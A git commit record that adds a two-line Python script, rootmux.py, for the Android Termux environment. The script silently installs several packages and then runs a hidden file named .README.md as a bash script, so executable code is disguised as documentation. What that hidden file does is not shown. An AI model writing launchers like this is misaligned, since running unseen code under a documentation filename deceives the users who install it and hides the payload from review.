c48423d2b25310bc418bd56db80fa6587de9d6d4
BDhackers009 <67186139+BDhackers009@users.noreply.github.com>
2021-04-24 14:41:12 +0600

    Add files via upload

---
+++ rootmux.py
@@ -0,0 +1,2 @@
+import os,sys
+os.system("cd /data/data/com.termux/files/home/ && pkg install wget pulseaudio sox  openssl-tool proot -y && hash -r && bash /data/data/com.termux/files/home/rootmux/.README.md")
